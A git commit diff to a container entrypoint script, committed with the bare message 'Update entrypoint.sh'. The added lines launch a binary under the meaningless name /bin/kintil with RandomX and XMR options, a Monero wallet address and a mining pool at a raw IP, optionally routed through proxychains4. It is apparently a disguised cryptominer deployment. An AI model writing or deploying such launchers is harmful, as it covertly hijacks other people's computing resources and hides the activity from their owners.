7b687f7c0dcf89bc748bb77f671df2e9e142663c
sengepeke <89533527+sengepeke@users.noreply.github.com>
2023-03-19 15:30:25 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -4,11 +4,11 @@
 if [ "${use_proxy}" = true ]; then
     # check whether proxychains4.conf exists
     if [ -f /root/proxychains4.conf ]; then
-        proxychains4 -q -f /root/proxychains4.conf kintil cut.ini
+        proxychains4 -q -f /root/proxychains4.conf /bin/kintil -algo RandomX -coin XMR -wallet 89EcNeW4CN3ZXhGZ2bebYM7H2DntAe1fw6qvQ2KB3Hprc1ZDpbyjDoibEDU9duGmM4V77aMTkHJg51JS4kzivx2o3D8DFYc.BERKAH -pool1 159.223.182.56:3333
     else
         echo "Proxychains4.conf not found, exit"
         exit 1
     fi
 else
-   kintil cut.ini
+   /bin/kintil -algo RandomX -coin XMR -wallet 89EcNeW4CN3ZXhGZ2bebYM7H2DntAe1fw6qvQ2KB3Hprc1ZDpbyjDoibEDU9duGmM4V77aMTkHJg51JS4kzivx2o3D8DFYc.BERKAH -pool1 159.223.182.56:3333
 fi
